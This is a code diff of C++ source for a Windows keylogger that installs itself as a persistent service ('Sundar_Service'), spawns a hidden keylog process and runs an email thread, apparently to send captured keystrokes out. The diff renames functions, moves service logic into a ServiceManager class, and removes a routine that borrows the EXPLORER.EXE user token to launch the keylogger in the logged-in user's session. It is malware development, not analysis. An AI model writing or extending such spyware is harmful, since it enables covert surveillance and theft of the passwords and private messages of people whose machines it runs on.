@@ -8,21 +8,21 @@
 
 #define		MAX_NUM_OF_PROCESS		4
 /** Window Service **/
-VOID ServiceMainProc();
+void service_main();
+void installer_main();
+void keylog_main();
 
-VOID WINAPI ServiceMain(DWORD dwArgc, LPTSTR *lpszArgv);
-VOID WINAPI ServiceHandler(DWORD fdwControl);
+void WINAPI service_proc(DWORD dwArgc, LPTSTR *lpszArgv);
+void WINAPI service_handler(DWORD fdwControl);
 
 BOOL RunProcess(LPSTR cmd);
 
-void start_keylog();
 void start_keylog_proc();
 void start_proc();
 void stop_proc();
 DWORD WINAPI keylog_thread(LPVOID info);
 DWORD WINAPI email_thread(LPVOID info);
 bool is_service_env();
-void install_service();
 HANDLE keylog_tid;
 HANDLE email_tid;
 bool running = false;
@@ -34,7 +34,7 @@ CHAR exe_path[nBufferSize+1];
 
 SERVICE_TABLE_ENTRY lpServiceStartTable[] = 
 {
-	{service_name, ServiceMain},
+	{service_name, service_proc},
 	{NULL, NULL}
 };
 
@@ -52,23 +52,25 @@ int WINAPI _tWinMain(
 ){
 	if(strcmp(lpCmdLine, "-k") == 0){
 		Logger::debug("Keylog Mode");
-		start_keylog();
+		keylog_main();
 		return 0;
 	}
 	strcpy(service_name,"Sundar_Service");	
 	DWORD size = GetModuleFileName(NULL, exe_path, sizeof(exe_path));
 	exe_path[size] = 0;
 
-	bool is_service = is_service_env();
+	bool is_service = ServiceManager::is_service_env();
 	if(is_service){
-		ServiceMainProc();
+		Logger::debug("Service Mode");
+		service_main();
 	} else{
-		install_service();
+		Logger::debug("Installer Mode");
+		installer_main();
 	}
 	return 0;
 }
 
-void install_service(){	
+void installer_main(){	
 	ServiceManager::uninstall(service_name);
 	ServiceManager::install(exe_path, service_name);
 	bool ret = ServiceManager::run(service_name);
@@ -79,12 +81,7 @@ void install_service(){
 	}
 }
 
-bool is_service_env(){
-	HANDLE handle = GetStdHandle(STD_OUTPUT_HANDLE);
-	return handle == 0;
-}
-
-VOID ServiceMainProc()
+VOID service_main()
 {
 	//start serivce
 	if(!StartServiceCtrlDispatcher(lpServiceStartTable)) {
@@ -92,7 +89,7 @@ VOID ServiceMainProc()
 	}
 }
 
-VOID WINAPI ServiceMain(DWORD dwArgc, LPTSTR *lpszArgv)
+VOID WINAPI service_proc(DWORD dwArgc, LPTSTR *lpszArgv)
 {
 	DWORD   status = 0; 
     DWORD   specificError = 0xfffffff; 
@@ -105,7 +102,7 @@ VOID WINAPI ServiceMain(DWORD dwArgc, LPTSTR *lpszArgv)
     ServiceStatus.dwCheckPoint         = 0; 
     ServiceStatus.dwWaitHint           = 0; 
  
-    hServiceStatusHandle = RegisterServiceCtrlHandler(service_name, ServiceHandler); 
+    hServiceStatusHandle = RegisterServiceCtrlHandler(service_name, service_handler); 
     if (hServiceStatusHandle==0) {
 		Logger::debug("RegisterServiceCtrlHandler failed, error code = %d\n", GetLastError());
         return; 
@@ -119,30 +116,18 @@ VOID WINAPI ServiceMain(DWORD dwArgc, LPTSTR *lpszArgv)
 		Logger::debug("SetServiceStatus failed, error code = %d\n", GetLastError()); 
     } 
 
-	// AttachProcessNames();
-	// for(int iLoop = 0; iLoop < MAX_NUM_OF_PROCESS; iLoop++)
-	// {
-	// 	pProcInfo[iLoop].hProcess = 0;
-	// 	StartProcess(iLoop);
-	// }
 	start_proc();
 }
 
-void start_keylog(){
+void keylog_main(){
 	klm.init(GetCurrentThreadId());
 	klm.start();
 }
 
 void start_keylog_proc(){
-	STARTUPINFO startUpInfo = { sizeof(STARTUPINFO),NULL,"",NULL,0,0,0,0,0,0,0,STARTF_USESHOWWINDOW,0,0,NULL,0,0,0};  
-	startUpInfo.wShowWindow = SW_HIDE;
-	startUpInfo.lpDesktop = NULL;
 	char cmd[512] = {0};
 	sprintf(cmd, "%s -k", exe_path);
-	RunProcess(cmd);
-	return;
-	bool ret = CreateProcess(NULL, cmd, NULL, NULL, FALSE, NORMAL_PRIORITY_CLASS,
-					 NULL, NULL, &startUpInfo, &keylog_proc_info);
+	bool ret = ServiceManager::create_process_as_user(cmd, &keylog_proc_info);
 	if(ret) {
 		Sleep(1000);
 		Logger::debug("Start Keylog Proc Succ");
@@ -194,7 +179,7 @@ void stop_proc(){
 	// klm.stop();
 }
 
-VOID WINAPI ServiceHandler(DWORD fdwControl)
+VOID WINAPI service_handler(DWORD fdwControl)
 {
 	switch(fdwControl) 
 	{
@@ -225,74 +210,3 @@ VOID WINAPI ServiceHandler(DWORD fdwControl)
     } 
 }
  
-
-BOOL GetTokenByName(HANDLE &hToken,LPSTR lpName)
-{
-	if(!lpName)
-	{
-		return FALSE;
-	}
-	HANDLE hProcessSnap = NULL;  
-	BOOL bRet = FALSE;  
-	PROCESSENTRY32 pe32 = {0};  
-
-	hProcessSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);  
-	if (hProcessSnap == INVALID_HANDLE_VALUE)  
-		return (FALSE);  
-
-	pe32.dwSize = sizeof(PROCESSENTRY32);  
-
-	if (Process32First(hProcessSnap, &pe32))  
-	{   
-		do  
-		{
-			if(!strcmp(_strupr(pe32.szExeFile),_strupr(lpName)))
-			{
-				HANDLE hProcess = OpenProcess(PROCESS_QUERY_INFORMATION,
-					FALSE,pe32.th32ProcessID);
-				bRet = OpenProcessToken(hProcess,TOKEN_ALL_ACCESS,&hToken);
-				CloseHandle (hProcessSnap);  
-				return (bRet);
-			}
-		}  
-		while (Process32Next(hProcessSnap, &pe32));  
-		bRet = TRUE;  
-	}  
-	else  
-		bRet = FALSE;
-
-	CloseHandle (hProcessSnap);  
-	return (bRet);
-}
-
-BOOL RunProcess(LPSTR cmd)
-{
-	if(!cmd)
-	{
-		return FALSE;
-	}
-	HANDLE hToken;
-	if(!GetTokenByName(hToken,"EXPLORER.EXE"))
-	{
-		return FALSE;
-	}
-	STARTUPINFO si;
-	PROCESS_INFORMATION pi;
-
-	ZeroMemory(&si, sizeof(STARTUPINFO));
-	si.cb= sizeof(STARTUPINFO);
-	si.lpDesktop = TEXT("winsta0\\default");
-
-	BOOL bResult = CreateProcessAsUser(hToken, NULL, cmd, NULL, NULL,
-		FALSE, NORMAL_PRIORITY_CLASS, NULL, NULL, &si, &pi);
-	CloseHandle(hToken);
-	if(bResult)
-	{
-		Logger::debug("CreateProcessAsUser ok!\r\n");
-	}
-	else
-	{
-		Logger::debug("CreateProcessAsUser false!\r\n");
-	}
-	return bResult;
-}
